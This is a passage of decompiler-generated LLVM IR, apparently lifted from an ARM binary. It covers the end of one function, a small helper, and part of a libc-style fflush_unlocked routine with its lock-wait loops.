  %v2_16568 = load i32, i32* %v1_16568, align 4
  store i32 %v2_16568, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16568, i32* %r2.global-to-local, align 4
  %v2_1657462 = load i32, i32* %v1_16568, align 4
  store i32 %v2_1657462, i32* %r3.global-to-local, align 4
  %v3_1657864 = icmp uge i32 %v2_1657462, %v2_16568
  store i1 %v3_1657864, i1* %cpsr_c.global-to-local, align 1
  %v9_1657870 = icmp eq i32 %v2_1657462, %v2_16568
  br i1 %v9_1657870, label %dec_label_pc_16580, label %dec_label_pc_16598

dec_label_pc_16580:                               ; preds = %dec_label_pc_16568, %dec_label_pc_16580.dec_label_pc_16574_crit_edge
  %v0_1658071 = phi i32 [ %v1_16578.pre, %dec_label_pc_16580.dec_label_pc_16574_crit_edge ], [ %v2_16568, %dec_label_pc_16568 ]
  store i32 %v0_1658071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16590 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16590, label %dec_label_pc_16594, label %dec_label_pc_16580.dec_label_pc_16574_crit_edge

dec_label_pc_16580.dec_label_pc_16574_crit_edge:  ; preds = %dec_label_pc_16580
  %v0_16574.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16578.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16574 = inttoptr i32 %v0_16574.pre to i32*
  %v2_16574 = load i32, i32* %v1_16574, align 4
  store i32 %v2_16574, i32* %r3.global-to-local, align 4
  %v3_16578 = icmp uge i32 %v2_16574, %v1_16578.pre
  store i1 %v3_16578, i1* %cpsr_c.global-to-local, align 1
  %v9_16578 = icmp eq i32 %v2_16574, %v1_16578.pre
  br i1 %v9_16578, label %dec_label_pc_16580, label %dec_label_pc_16598

dec_label_pc_16594:                               ; preds = %dec_label_pc_16580
  %v0_16594 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16594, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16598

dec_label_pc_16598:                               ; preds = %dec_label_pc_16568, %dec_label_pc_16580.dec_label_pc_16574_crit_edge, %dec_label_pc_16594
  %v0_165a0 = phi i32 [ %v0_16594, %dec_label_pc_16594 ], [ %v2_1657462, %dec_label_pc_16568 ], [ %v2_16574, %dec_label_pc_16580.dec_label_pc_16574_crit_edge ]
  %v1_16598 = phi i32 [ %v0_16594, %dec_label_pc_16594 ], [ %v2_16568, %dec_label_pc_16568 ], [ %v1_16578.pre, %dec_label_pc_16580.dec_label_pc_16574_crit_edge ]
  %v3_16598 = icmp uge i32 %v0_165a0, %v1_16598
  store i1 %v3_16598, i1* %cpsr_c.global-to-local, align 1
  %v9_16598 = icmp eq i32 %v0_165a0, %v1_16598
  br i1 %v9_16598, label %dec_label_pc_165a0, label %dec_label_pc_16598.dec_label_pc_16568_crit_edge

dec_label_pc_16598.dec_label_pc_16568_crit_edge:  ; preds = %dec_label_pc_16598
  %v0_16568.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16568

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16598
  %v2_165a0 = icmp ne i32 %v1_16598, 0
  store i1 %v2_165a0, i1* %cpsr_c.global-to-local, align 1
  %v7_165a4 = icmp slt i32 %v1_16598, 2
  br i1 %v7_165a4, label %dec_label_pc_165c0, label %dec_label_pc_165a8

dec_label_pc_165a8:                               ; preds = %dec_label_pc_165a0
  %v0_165a8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_165a8, i32* %r0.global-to-local, align 4
  %v0_165ac = load i32, i32* %r1.global-to-local, align 4
  %v1_165ac = add i32 %v0_165ac, 129
  store i32 %v1_165ac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165c0

dec_label_pc_165c0:                               ; preds = %dec_label_pc_16530, %dec_label_pc_165a8, %dec_label_pc_165a0
  %v2_165c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_165c4, i32* %r4.global-to-local, align 4
  %v1_165c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_165c8

; uselistorder directives
  uselistorder i32 %v0_16594, { 1, 0, 2 }
  uselistorder i32 %v1_16578.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16568, { 1, 0 }
  uselistorder i32 %v0_164f4, { 1, 0, 2 }
  uselistorder i32 %v1_164d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_164c8, { 1, 0 }
  uselistorder i32 %v0_16494, { 2, 1, 0 }
  uselistorder i32 %v0_16438, { 1, 0 }
  uselistorder i32 %v0_1641c, { 1, 0, 2 }
  uselistorder i32 %v1_16400.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_163ec, { 1, 0 }
  uselistorder i32 %v0_16390, { 1, 0, 2 }
  uselistorder i32 %v1_16374.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16348, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 44, 7, 8, 9, 10, 11, 12, 13, 15, 14, 2, 16, 17, 18, 42, 43, 19, 20, 21, 22, 23, 24, 25, 27, 26, 0, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 1, 40, 41 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 25, 26, 5, 6, 7, 9, 8, 1, 10, 13, 11, 12, 27, 14, 16, 15, 0, 17, 18, 19, 20, 21, 23, 24, 22 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_165c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16598, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16580, { 1, 0 }
  uselistorder label %dec_label_pc_16530, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16520, { 1, 2, 0 }
  uselistorder label %dec_label_pc_164f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_164e0, { 1, 0 }
  uselistorder label %dec_label_pc_16494, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1645c, { 1, 0 }
  uselistorder label %dec_label_pc_16430, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16420, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16408, { 1, 0 }
  uselistorder label %dec_label_pc_163a4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16394, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1637c, { 1, 0 }
}

define i32 @function_165d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_165d0:
  %v0_165d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_165d0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_165d0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_165d0, %bb
  %v10_165e4 = phi i32 [ %arg1, %dec_label_pc_165d0 ], [ 0, %bb ]
  ret i32 %v10_165e4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_165e8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r6, align 4
  %v4_165f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 76) to i32*), align 4
  store i32 %v4_165f8, i32* %r3.global-to-local, align 4
  %v4_165fc = icmp uge i32 %tmp, %v4_165f8
  store i1 %v4_165fc, i1* %cpsr_c.global-to-local, align 1
  %v10_165fc = icmp eq i32 %tmp, %v4_165f8
  br i1 %v10_165fc, label %bb, label %dec_label_pc_16614

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16624

dec_label_pc_16614:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16618 = icmp eq i16* %arg1, null
  br i1 %v3_16618, label %dec_label_pc_16624, label %dec_label_pc_16938

dec_label_pc_16624:                               ; preds = %bb, %dec_label_pc_16614
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16614 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16628 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 160) to i32*), align 4
  store i32 %v4_16628, i32* %r5.global-to-local, align 4
  %v0_1662c = call i32 @__aeabi_read_tp()
  store i32 %v0_1662c, i32* %r0.global-to-local, align 4
  %v1_16630 = add i32 %v4_16628, 8
  %v2_16630 = inttoptr i32 %v1_16630 to i32*
  %v3_16630 = load i32, i32* %v2_16630, align 4
  store i32 %v3_16630, i32* %r3.global-to-local, align 4
  %v1_16634 = add i32 %v0_1662c, -1168
  store i32 %v1_16634, i32* %r8.global-to-local, align 4
  %v3_16638 = icmp uge i32 %v3_16630, %v1_16634
  store i1 %v3_16638, i1* %cpsr_c.global-to-local, align 1
  %v9_16638 = icmp eq i32 %v3_16630, %v1_16634
  br i1 %v9_16638, label %dec_label_pc_16680, label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %dec_label_pc_16624
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16628, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1664c143 = inttoptr i32 %v4_16628 to i32*
  %v2_1664c144 = load i32, i32* %v1_1664c143, align 4
  store i32 %v2_1664c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16650146 = icmp eq i32 %v2_1664c144, 0
  br i1 %v9_16650146, label %dec_label_pc_16658, label %dec_label_pc_16670

dec_label_pc_16658:                               ; preds = %dec_label_pc_16640, %dec_label_pc_16658.dec_label_pc_1664c_crit_edge
  %v0_16658147 = phi i32 [ %v1_16650.pre, %dec_label_pc_16658.dec_label_pc_1664c_crit_edge ], [ 0, %dec_label_pc_16640 ]
  store i32 %v0_16658147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16668 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16668, label %dec_label_pc_1666c, label %dec_label_pc_16658.dec_label_pc_1664c_crit_edge

dec_label_pc_16658.dec_label_pc_1664c_crit_edge:  ; preds = %dec_label_pc_16658
  %v0_1664c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16650.pre = load i32, i32* @r4, align 4
  %v1_1664c = inttoptr i32 %v0_1664c.pre to i32*
  %v2_1664c = load i32, i32* %v1_1664c, align 4
  store i32 %v2_1664c, i32* %r3.global-to-local, align 4
  %v3_16650 = icmp uge i32 %v2_1664c, %v1_16650.pre
  store i1 %v3_16650, i1* %cpsr_c.global-to-local, align 1
  %v9_16650 = icmp eq i32 %v2_1664c, %v1_16650.pre
  br i1 %v9_16650, label %dec_label_pc_16658, label %dec_label_pc_16670

dec_label_pc_1666c:                               ; preds = %dec_label_pc_16658
  %v0_1666c = load i32, i32* @r4, align 4
  store i32 %v0_1666c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %dec_label_pc_16640, %dec_label_pc_16658.dec_label_pc_1664c_crit_edge, %dec_label_pc_1666c
  %v0_16670 = phi i32 [ %v0_1666c, %dec_label_pc_1666c ], [ %v2_1664c144, %dec_label_pc_16640 ], [ %v2_1664c, %dec_label_pc_16658.dec_label_pc_1664c_crit_edge ]
  %v1_16670 = phi i32 [ %v0_1666c, %dec_label_pc_1666c ], [ 0, %dec_label_pc_16640 ], [ %v1_16650.pre, %dec_label_pc_16658.dec_label_pc_1664c_crit_edge ]
  %v3_16670 = icmp uge i32 %v0_16670, %v1_16670
  store i1 %v3_16670, i1* %cpsr_c.global-to-local, align 1
  %v9_16670 = icmp eq i32 %v0_16670, %v1_16670
  br i1 %v9_16670, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16670
  %v1_16674 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16674, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16670, %bb65
  %v1_16678 = xor i1 %v9_16670, true
  call void @__pseudo_cond_branch(i1 %v1_16678, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_1667c = load i32, i32* %r8.global-to-local, align 4
  %v1_1667c = load i32, i32* %r5.global-to-local, align 4
  %v2_1667c = add i32 %v1_1667c, 8
  %v3_1667c = inttoptr i32 %v2_1667c to i32*
  store i32 %v0_1667c, i32* %v3_1667c, align 4
  br label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_16624, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16684 = load i32, i32* @r6, align 4
  %v2_16684 = add i32 %v0_16684, 160
  %v3_16684 = inttoptr i32 %v2_16684 to i32*
  %v4_16684 = load i32, i32* %v3_16684, align 4
  store i32 %v4_16684, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1668c = add i32 %v0_16684, 12
  %v3_1668c = inttoptr i32 %v2_1668c to i32*
  %v4_1668c = load i32, i32* %v3_1668c, align 4
  store i32 %v4_1668c, i32* %r2.global-to-local, align 4
  %v1_16690 = add i32 %v4_16684, 4
  %v2_16690 = inttoptr i32 %v1_16690 to i32*
  %v3_16690 = load i32, i32* %v2_16690, align 4
  store i32 %v3_16690, i32* %r1.global-to-local, align 4
  %v1_16694 = inttoptr i32 %v4_1668c to i32*
  %v2_16694 = load i32, i32* %v1_16694, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16698 = icmp eq i32 %v3_16690, 0
  %v1_1669c = add i32 %v2_16694, 1
  store i32 %v1_1669c, i32* %r3.global-to-local, align 4
  store i32 %v1_1669c, i32* %v1_16694, align 4
  br i1 %v2_16698, label %dec_label_pc_166a8, label %dec_label_pc_16708

dec_label_pc_166a8:                               ; preds = %dec_label_pc_16680
  %v0_166a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_166a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_166a8 = add i32 %v1_166a8, 8
  %v3_166a8 = inttoptr i32 %v2_166a8 to i32*
  store i32 %v0_166a8, i32* %v3_166a8, align 4
  %v0_166ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_166ac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_166e0.dec_label_pc_166b0_crit_edge, %dec_label_pc_166a8
  %v0_166b0 = phi i32 [ %v0_166b0.pre, %dec_label_pc_166e0.dec_label_pc_166b0_crit_edge ], [ %v0_166ac, %dec_label_pc_166a8 ]
  %v1_166b0 = inttoptr i32 %v0_166b0 to i32*
  %v2_166b0 = load i32, i32* %v1_166b0, align 4
  store i32 %v2_166b0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_166b0, i32* %r2.global-to-local, align 4
  %v2_166bc131 = load i32, i32* %v1_166b0, align 4
  store i32 %v2_166bc131, i32* %r3.global-to-local, align 4
  %v3_166c0133 = icmp uge i32 %v2_166bc131, %v2_166b0
  store i1 %v3_166c0133, i1* %cpsr_c.global-to-local, align 1
  %v9_166c0139 = icmp eq i32 %v2_166bc131, %v2_166b0
  br i1 %v9_166c0139, label %dec_label_pc_166c8, label %dec_label_pc_166e0

dec_label_pc_166c8:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166c8.dec_label_pc_166bc_crit_edge
  %v0_166c8140 = phi i32 [ %v1_166c0.pre, %dec_label_pc_166c8.dec_label_pc_166bc_crit_edge ], [ %v2_166b0, %dec_label_pc_166b0 ]
  store i32 %v0_166c8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_166d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_166d8, label %dec_label_pc_166dc, label %dec_label_pc_166c8.dec_label_pc_166bc_crit_edge

dec_label_pc_166c8.dec_label_pc_166bc_crit_edge:  ; preds = %dec_label_pc_166c8
  %v0_166bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_166c0.pre = load i32, i32* @r4, align 4
  %v1_166bc = inttoptr i32 %v0_166bc.pre to i32*
  %v2_166bc = load i32, i32* %v1_166bc, align 4
  store i32 %v2_166bc, i32* %r3.global-to-local, align 4
  %v3_166c0 = icmp uge i32 %v2_166bc, %v1_166c0.pre
  store i1 %v3_166c0, i1* %cpsr_c.global-to-local, align 1
  %v9_166c0 = icmp eq i32 %v2_166bc, %v1_166c0.pre
  br i1 %v9_166c0, label %dec_label_pc_166c8, label %dec_label_pc_166e0

dec_label_pc_166dc:                               ; preds = %dec_label_pc_166c8
  %v0_166dc = load i32, i32* @r4, align 4
  store i32 %v0_166dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166e0

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166c8.dec_label_pc_166bc_crit_edge, %dec_label_pc_166dc
  %v0_166e8 = phi i32 [ %v0_166dc, %dec_label_pc_166dc ], [ %v2_166bc131, %dec_label_pc_166b0 ], [ %v2_166bc, %dec_label_pc_166c8.dec_label_pc_166bc_crit_edge ]
  %v1_166e0 = phi i32 [ %v0_166dc, %dec_label_pc_166dc ], [ %v2_166b0, %dec_label_pc_166b0 ], [ %v1_166c0.pre, %dec_label_pc_166c8.dec_label_pc_166bc_crit_edge ]
  %v3_166e0 = icmp uge i32 %v0_166e8, %v1_166e0
  store i1 %v3_166e0, i1* %cpsr_c.global-to-local, align 1
  %v9_166e0 = icmp eq i32 %v0_166e8, %v1_166e0
  br i1 %v9_166e0, label %dec_label_pc_166e8, label %dec_label_pc_166e0.dec_label_pc_166b0_crit_edge

dec_label_pc_166e0.dec_label_pc_166b0_crit_edge:  ; preds = %dec_label_pc_166e0
  %v0_166b0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166e8:                               ; preds = %dec_label_pc_166e0
  %v2_166e8 = icmp ne i32 %v1_166e0, 0
  store i1 %v2_166e8, i1* %cpsr_c.global-to-local, align 1
  %v7_166ec = icmp slt i32 %v1_166e0, 2
  br i1 %v7_166ec, label %dec_label_pc_16708, label %dec_label_pc_166f0

dec_label_pc_166f0:                               ; preds = %dec_label_pc_166e8
  %v0_166f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_166f0, i32* %r0.global-to-local, align 4
  %v0_166f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_166f4 = add i32 %v0_166f4, 129
  store i32 %v1_166f4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16708

dec_label_pc_16708:                               ; preds = %dec_label_pc_16680, %dec_label_pc_166f0, %dec_label_pc_166e8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1670c = load i32, i32* @r6, align 4
  %v2_1670c = add i32 %v0_1670c, 152
  %v3_1670c = inttoptr i32 %v2_1670c to i32*
  %v4_1670c = load i32, i32* %v3_1670c, align 4
  store i32 %v4_1670c, i32* %r5.global-to-local, align 4
  %v1_16710 = add i32 %v4_1670c, 8
  %v2_16710 = inttoptr i32 %v1_16710 to i32*
  %v3_16710 = load i32, i32* %v2_16710, align 4
  store i32 %v3_16710, i32* %r3.global-to-local, align 4
  %v1_16714 = load i32, i32* %r8.global-to-local, align 4
  %v3_16714 = icmp uge i32 %v3_16710, %v1_16714
  store i1 %v3_16714, i1* %cpsr_c.global-to-local, align 1
  %v9_16714 = icmp eq i32 %v3_16710, %v1_16714
  br i1 %v9_16714, label %dec_label_pc_1675c, label %dec_label_pc_1671c

dec_label_pc_1671c:                               ; preds = %dec_label_pc_16708
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1670c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16728123 = inttoptr i32 %v4_1670c to i32*
  %v2_16728124 = load i32, i32* %v1_16728123, align 4
  store i32 %v2_16728124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1672c126 = icmp eq i32 %v2_16728124, 0
  br i1 %v9_1672c126, label %dec_label_pc_16734, label %dec_label_pc_1674c

dec_label_pc_16734:                               ; preds = %dec_label_pc_1671c, %dec_label_pc_16734.dec_label_pc_16728_crit_edge
  %v0_16734127 = phi i32 [ %v1_1672c.pre, %dec_label_pc_16734.dec_label_pc_16728_crit_edge ], [ 0, %dec_label_pc_1671c ]
  store i32 %v0_16734127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16744 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16744, label %dec_label_pc_16748, label %dec_label_pc_16734.dec_label_pc_16728_crit_edge

dec_label_pc_16734.dec_label_pc_16728_crit_edge:  ; preds = %dec_label_pc_16734
  %v0_16728.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1672c.pre = load i32, i32* @r4, align 4
  %v1_16728 = inttoptr i32 %v0_16728.pre to i32*
  %v2_16728 = load i32, i32* %v1_16728, align 4
  store i32 %v2_16728, i32* %r3.global-to-local, align 4
  %v3_1672c = icmp uge i32 %v2_16728, %v1_1672c.pre
  store i1 %v3_1672c, i1* %cpsr_c.global-to-local, align 1
  %v9_1672c = icmp eq i32 %v2_16728, %v1_1672c.pre
  br i1 %v9_1672c, label %dec_label_pc_16734, label %dec_label_pc_1674c

dec_label_pc_16748:                               ; preds = %dec_label_pc_16734
  %v0_16748 = load i32, i32* @r4, align 4
  store i32 %v0_16748, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %dec_label_pc_1671c, %dec_label_pc_16734.dec_label_pc_16728_crit_edge, %dec_label_pc_16748
  %v0_1674c = phi i32 [ %v0_16748, %dec_label_pc_16748 ], [ %v2_16728124, %dec_label_pc_1671c ], [ %v2_16728, %dec_label_pc_16734.dec_label_pc_16728_crit_edge ]
  %v1_1674c = phi i32 [ %v0_16748, %dec_label_pc_16748 ], [ 0, %dec_label_pc_1671c ], [ %v1_1672c.pre, %dec_label_pc_16734.dec_label_pc_16728_crit_edge ]
  %v3_1674c = icmp uge i32 %v0_1674c, %v1_1674c
  store i1 %v3_1674c, i1* %cpsr_c.global-to-local, align 1
  %v9_1674c = icmp eq i32 %v0_1674c, %v1_1674c
  br i1 %v9_1674c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1674c
  %v1_16750 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16750, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1674c, %bb67
  %v1_16754 = xor i1 %v9_1674c, true
  call void @__pseudo_cond_branch(i1 %v1_16754, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_16758 = load i32, i32* %r8.global-to-local, align 4
  %v1_16758 = load i32, i32* %r5.global-to-local, align 4
  %v2_16758 = add i32 %v1_16758, 8
  %v3_16758 = inttoptr i32 %v2_16758 to i32*
  store i32 %v0_16758, i32* %v3_16758, align 4
  %v0_16760.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1675c

dec_label_pc_1675c:                               ; preds = %dec_label_pc_16708, %bb68
  %v0_1676c = phi i32 [ %v0_1670c, %dec_label_pc_16708 ], [ %v0_16760.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16760 = add i32 %v0_1676c, 152
  %v3_16760 = inttoptr i32 %v2_16760 to i32*
  %v4_16760 = load i32, i32* %v3_16760, align 4
  store i32 %v4_16760, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16768 = add i32 %v4_16760, 4
  %v2_16768 = inttoptr i32 %v1_16768 to i32*
  %v3_16768 = load i32, i32* %v2_16768, align 4
  store i32 %v3_16768, i32* %r1.global-to-local, align 4
  %v2_1676c = add i32 %v0_1676c, 76
  %v3_1676c = inttoptr i32 %v2_1676c to i32*
  %v4_1676c = load i32, i32* %v3_1676c, align 4
  store i32 %v4_1676c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16770 = icmp eq i32 %v3_16768, 0
  %v1_16774 = inttoptr i32 %v4_1676c to i32*
  %v2_16774 = load i32, i32* %v1_16774, align 4
  store i32 %v2_16774, i32* @r5, align 4
  br i1 %v2_16770, label %dec_label_pc_1677c, label %dec_label_pc_167dc

dec_label_pc_1677c:                               ; preds = %dec_label_pc_1675c
  %v2_1677c = add i32 %v4_16760, 8
  %v3_1677c = inttoptr i32 %v2_1677c to i32*
  store i32 0, i32* %v3_1677c, align 4
  %v0_16780 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16780, i32* @r7, align 4
  br label %dec_label_pc_16784

dec_label_pc_16784:                               ; preds = %dec_label_pc_167b4.dec_label_pc_16784_crit_edge, %dec_label_pc_1677c
  %v0_16784 = phi i32 [ %v0_16784.pre, %dec_label_pc_167b4.dec_label_pc_16784_crit_edge ], [ %v0_16780, %dec_label_pc_1677c ]
  %v1_16784 = inttoptr i32 %v0_16784 to i32*
  %v2_16784 = load i32, i32* %v1_16784, align 4
  store i32 %v2_16784, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16784, i32* %r2.global-to-local, align 4
  %v2_16790111 = load i32, i32* %v1_16784, align 4
  store i32 %v2_16790111, i32* %r3.global-to-local, align 4
  %v3_16794113 = icmp uge i32 %v2_16790111, %v2_16784
  store i1 %v3_16794113, i1* %cpsr_c.global-to-local, align 1
  %v9_16794119 = icmp eq i32 %v2_16790111, %v2_16784
  br i1 %v9_16794119, label %dec_label_pc_1679c, label %dec_label_pc_167b4

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16784, %dec_label_pc_1679c.dec_label_pc_16790_crit_edge
  %v0_1679c120 = phi i32 [ %v1_16794.pre, %dec_label_pc_1679c.dec_label_pc_16790_crit_edge ], [ %v2_16784, %dec_label_pc_16784 ]
  store i32 %v0_1679c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_167ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_167ac, label %dec_label_pc_167b0, label %dec_label_pc_1679c.dec_label_pc_16790_crit_edge

dec_label_pc_1679c.dec_label_pc_16790_crit_edge:  ; preds = %dec_label_pc_1679c
  %v0_16790.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16794.pre = load i32, i32* @r4, align 4
  %v1_16790 = inttoptr i32 %v0_16790.pre to i32*
  %v2_16790 = load i32, i32* %v1_16790, align 4
  store i32 %v2_16790, i32* %r3.global-to-local, align 4
  %v3_16794 = icmp uge i32 %v2_16790, %v1_16794.pre
  store i1 %v3_16794, i1* %cpsr_c.global-to-local, align 1
  %v9_16794 = icmp eq i32 %v2_16790, %v1_16794.pre
  br i1 %v9_16794, label %dec_label_pc_1679c, label %dec_label_pc_167b4

dec_label_pc_167b0:                               ; preds = %dec_label_pc_1679c
  %v0_167b0 = load i32, i32* @r4, align 4
  store i32 %v0_167b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167b4

dec_label_pc_167b4:                               ; preds = %dec_label_pc_16784, %dec_label_pc_1679c.dec_label_pc_16790_crit_edge, %dec_label_pc_167b0
